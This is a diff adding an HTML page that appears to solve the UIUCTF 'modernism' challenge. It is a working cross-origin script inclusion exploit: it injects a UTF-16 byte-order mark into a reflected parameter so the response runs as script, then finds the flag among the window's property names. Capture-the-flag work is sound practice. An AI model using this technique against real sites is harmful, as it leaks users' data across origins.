@@ -1,0 +1,17 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <meta http-equiv="X-UA-Compatible" content="ie=edge" />
+    <title>Static Template</title>
+  </head>
+  <body>
+    <script src="https://modernism.chal.uiuc.tf/?p=FEFF002B002B00770069006E0064006F0077002E"></script>
+    <script>
+      const encutf16=(s)=>[...s].flatMap(c=>[String.fromCharCode(c.charCodeAt(0)>>8),String.fromCharCode(c.charCodeAt(0)&0xff)]).join('');
+      const flag = Object.getOwnPropertyNames(window).map(x=>encutf16(x)).find(x=>x.startsWith('uiuctf{'));
+      console.log(flag);
+    </script>
+  </body>
+</html>
